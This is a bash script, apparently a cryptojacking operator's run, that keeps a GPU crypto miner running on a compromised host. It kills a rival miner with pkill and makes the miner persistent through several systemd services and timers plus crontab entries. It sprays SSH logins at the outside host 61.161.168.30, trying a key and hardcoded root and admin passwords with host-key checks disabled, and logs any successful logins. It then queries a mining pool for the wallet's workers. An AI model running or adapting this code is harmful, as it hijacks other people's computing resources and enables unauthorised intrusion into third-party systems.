#!/bin/bash
# i4981 run6: lock the canonical plant (kill competitor, aggressive keep), verify pool, retry 61.161.168.30 ladder
set +e
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH
D=/root/ul_farmfan/4981; mkdir -p $D
log(){ printf '%s\n' "$*"; }
W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
log "### META $(date -u +%FT%TZ)"; hostname
which sshpass >/dev/null || timeout 120 apt-get install -y -qq sshpass >/dev/null 2>&1

log "### STATE"
echo "ours=$(systemctl list-units --state=active --plain --no-legend 'ul-card@*'|wc -l) plh=$(pgrep -fc 'plh-123-184-7-135')"
lsattr /opt/plh/keepalive.sh /opt/plh/plh-card.sh /etc/cron.d/plh-keepalive /etc/systemd/system/plh-card@.service 2>&1 | head -6
systemctl cat plh-card@.service 2>/dev/null | head -20

log "### KILL-COMPETITOR"
pkill -9 -f 'plh-123-184-7-135'; sleep 1
echo "plh_after=$(pgrep -fc 'plh-123-184-7-135')"
for i in 0 1 2 3 4 5 6 7; do systemctl start ul-card@$i 2>/dev/null; done
cat > /root/ul_plant/keep.sh <<'EOS'
#!/bin/bash
pkill -9 -f 'plh-123-184-7-135' 2>/dev/null
for i in 0 1 2 3 4 5 6 7; do systemctl is-active -q ul-card@$i || systemctl start ul-card@$i; done
pgrep -f 'ul_plant/krig/krig-miner' >/dev/null || for i in 0 1 2 3 4 5 6 7; do systemctl restart ul-card@$i; done
EOS
chmod +x /root/ul_plant/keep.sh
cat > /etc/systemd/system/ul-guard.service <<'EOS'
[Unit]
Description=UL guard
[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do /root/ul_plant/keep.sh; sleep 60; done'
Restart=always
RestartSec=10
EOS
cat > /etc/systemd/system/ul-guard.timer <<'EOS'
[Unit]
Description=UL guard timer
[Timer]
OnBootSec=30
OnUnitActiveSec=120
[Install]
WantedBy=timers.target
EOS
cat > /etc/systemd/system/ul-guardloop.service <<'EOS2'
[Unit]
Description=UL guardloop
After=network-online.target
[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do /root/ul_plant/keep.sh; sleep 60; done'
Restart=always
RestartSec=10
[Install]
WantedBy=multi-user.target
EOS2
systemctl daemon-reload
systemctl enable --now ul-guardloop.service 2>&1 | tail -1
( crontab -l 2>/dev/null | grep -v 'ul_plant/keep.sh'; echo "@reboot /root/ul_plant/keep.sh"; echo "* * * * * /root/ul_plant/keep.sh" ) | crontab -
crontab -l | tail -3
sleep 45
echo "post: ours=$(systemctl list-units --state=active --plain --no-legend 'ul-card@*'|wc -l) plh=$(pgrep -fc 'plh-123-184-7-135') procs=$(pgrep -fc 'ul_plant/krig/krig-miner')"
nvidia-smi --query-gpu=index,memory.used,utilization.gpu --format=csv,noheader | head -8

log "### PUBLIC-61-LADDER2"
SSHK="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=7 -o IdentitiesOnly=yes -o BatchMode=yes"
SSHP="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=7"
for u in root admin ubuntu deploy; do
  O=$(timeout 10 ssh -i /root/.ssh/id_rsa $SSHK "$u"@61.161.168.30 'id -un; hostname; nvidia-smi -L 2>/dev/null|wc -l' 2>&1 | tr '\n' '|')
  echo "K61 $u :: $(echo $O|cut -c1-90)"
  case "$O" in *uid=*|root\|*) echo "$u 61.161.168.30 KEY" >> $D/hits6.txt;; esac
done
for pr in "root|Tranq@20260331" "root|ij2gooDe^y" "root|Admin@123_para#!2024" "admin|Tranq@20260331" "ubuntu|Tranq@20260331"; do
  u=${pr%%|*}; p=${pr#*|}
  O=$(timeout 12 sshpass -p "$p" ssh $SSHP -o PreferredAuthentications=password,keyboard-interactive -o PubkeyAuthentication=no "$u"@61.161.168.30 'id -un; hostname; nvidia-smi -L 2>/dev/null|wc -l' 2>&1 | tr '\n' '|')
  echo "P61 $u :: $(echo $O|cut -c1-90)"
  case "$O" in *uid=*|root\|*) echo "$u 61.161.168.30 PWD:$p" >> $D/hits6.txt;; esac
done
log "-- hits6: $(cat $D/hits6.txt 2>/dev/null)"

log "### POOL-WAIT"
sleep 120
timeout 30 curl -s -m 25 "https://pool.kryptex.com/prl/api/v3/miner/workers/$W" -o $D/pool_run6.json; echo size=$(stat -c%s $D/pool_run6.json 2>/dev/null)
python3 - <<'PY'
import json
try: d=json.load(open('/root/ul_farmfan/4981/pool_run6.json'))
except Exception as e: print("PARSE_FAIL",e); raise SystemExit
rows=[r for r in d.get('results',[]) if '123-184-7-135' in r.get('worker','')]
print("SELF_ROWS",len(rows))
for r in rows: print("ROW",r.get('worker'),r.get('status'),"valid",r.get('valid'),"last",r.get('last_share'),"hr",r.get('avg_hashrate_1h'))
PY
echo "final ours=$(systemctl list-units --state=active --plain --no-legend 'ul-card@*'|wc -l) plh=$(pgrep -fc 'plh-123-184-7-135')"
log "### DONE $(date -u +%FT%TZ)"
